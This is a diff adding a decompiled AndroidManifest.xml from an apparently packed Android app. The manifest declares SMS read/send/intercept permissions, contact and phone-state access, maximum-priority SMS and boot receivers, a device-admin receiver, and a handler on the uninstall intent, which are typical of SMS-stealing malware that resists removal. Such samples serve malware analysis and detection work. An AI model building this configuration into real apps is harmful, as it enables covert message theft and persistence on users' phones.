@@ -1,0 +1,69 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="98" android:versionName="3.7.705" android:installLocation="1" package="com.zgeGdx510.sucrurg" platformBuildVersionCode="21" platformBuildVersionName="APKTOOL">
+    <uses-sdk android:minSdkVersion="8" android:targetSdkVersion="19"></uses-sdk>
+    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH"></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"></uses-permission>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_USER_PRESENT"></uses-permission>
+    <uses-permission android:name="android.permission.READ_CONTACTS"></uses-permission>
+    <uses-permission android:name="android.permission.INTERNET"></uses-permission>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
+    <uses-permission android:name="android.permission.READ_SMS"></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"></uses-permission>
+    <uses-permission android:name="android.permission.VIBRATE"></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"></uses-permission>
+    <uses-permission android:name="android.permission.GET_TASKS"></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_SMS"></uses-permission>
+    <uses-permission android:name="android.permission.SEND_SMS"></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"></uses-permission>
+    <application android:theme="@103000a" android:label="@7f060000" android:icon="@7f020000" android:name="com.chaosvmp.AppWrapper" android:allowBackup="true">
+        <meta-data android:name="app_name" android:value="com.phone.stop.db.PhoneApplication"></meta-data>
+        <meta-data android:name="app_package" android:value="com.zgeGdx510.sucrurg"></meta-data>
+        <activity android:theme="@7f070002" android:label="@7f060000" android:name="com.phone2.stop.activity.MainActivity" android:excludeFromRecents="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"></action>
+                <category android:name="android.intent.category.LAUNCHER"></category>
+            </intent-filter>
+        </activity>
+        <activity android:label="@7f060000" android:name="com.phone2.stop.activity.DeleteActivity" android:excludeFromRecents="false">
+            <intent-filter>
+                <action android:name="android.intent.action.DELETE"></action>
+                <category android:name="android.intent.category.DEFAULT"></category>
+                <data android:scheme="package"></data>
+            </intent-filter>
+        </activity>
+        <service android:name="com.phone.stop6.service.SecondService" android:process=":thee_second2_service3"></service>
+        <service android:name="com.phone.stop6.service.BootService" android:enabled="true" android:exported="true"></service>
+        <service android:name="com.phone.stop6.service.SmsService" android:process=":thee_second2_service3"></service>
+        <receiver android:name="com.phone.stop.receiver.BootReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.PACKAGE_RESTARTED"></action>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"></action>
+                <action android:name="android.intent.action.PACKAGE_ADDED"></action>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"></action>
+                <action android:name="android.intent.action.PACKAGE_INSTALL"></action>
+                <action android:name="android.intent.action.ACTION_PACKAGE_CHANGED"></action>
+                <action android:name="android.intent.action.SIG_STR"></action>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"></action>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"></action>
+                <action android:name="android.intent.action.BATTERY_CHANGED"></action>
+                <action android:name="android.intent.action.PHONE_STATE"></action>
+                <action android:name="android.intent.action.BATTERY_LOW"></action>
+                <action android:name="android.intent.action.BATTERY_OKAY"></action>
+                <action android:name="android.intent.action.BOOT_COMPLETED"></action>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.phone.stop.receiver.SMSReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"></action>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.phone.stop.receiver.MyDeviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@7f040000"></meta-data>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"></action>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
